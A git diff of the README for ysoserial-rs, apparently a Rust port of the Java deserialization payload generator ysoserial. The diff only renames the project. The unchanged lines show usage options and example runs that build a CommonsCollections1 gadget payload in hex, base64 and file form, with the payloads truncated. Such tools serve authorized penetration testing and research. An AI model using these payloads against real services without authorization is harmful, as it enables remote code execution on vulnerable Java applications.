@@ -1,4 +1,4 @@
-# ysoserial_rs
+# ysoserial-rs
 
 - [ysoserial](https://github.com/frohoff/ysoserial)  implemented by rust
 
@@ -9,7 +9,7 @@
 ```shell
 Usage: ysoserial [-p <payload>] [-c <command>] [--url <url>] [--echo-name <echo-name>] [--command-name <command-name>] [-o <output>] [-f <format>] [-l]
 
-ysoserial_rs
+ysoserial-rs
 
 Options:
   -p, --payload     select a payload
@@ -29,23 +29,23 @@ Options:
 - hex
 
 ```shell
-➜  ysoserial_rs git:(main) ✗ ysoserial -p cc1 -c whomai -f hex
+➜  ysoserial-rs git:(main) ✗ ysoserial -p cc1 -c whomai -f hex
 aced00057372003273756e2e7265666c6563742e616e6e6f746174696f6e2e416e6e6f746174696f6e496e766f636174696f...
 ```
 
 - base64
 
 ```shell
-➜  ysoserial_rs git:(main) ✗ ysoserial -p cc1 -c whomai -f base64
+➜  ysoserial-rs git:(main) ✗ ysoserial -p cc1 -c whomai -f base64
 rO0ABXNyADJzdW4ucmVmbGVjdC5hbm5vdGF0aW9uLkFubm90YXRpb25JbnZvY2F0aW9uSGFuZGxlclXK9Q8Vy36lAgACTAAMbWVtYm...
 ```
 
 ### output
 
 ```shell
-➜  ysoserial_rs git:(main) ✗ ysoserial -p cc1 -c whomai -o cc1.ser
+➜  ysoserial-rs git:(main) ✗ ysoserial -p cc1 -c whomai -o cc1.ser
 写入文件:cc1.ser,payload大小:1395
-➜  ysoserial_rs git:(main) ✗ cat cc1.ser|xxd -ps
+➜  ysoserial-rs git:(main) ✗ cat cc1.ser|xxd -ps
 aced00057372003273756e2e7265666c6563742e616e6e6f746174696f6e
 2e416e6e6f746174696f6e496e766f636174696f6e48616e646c657255ca
 ...
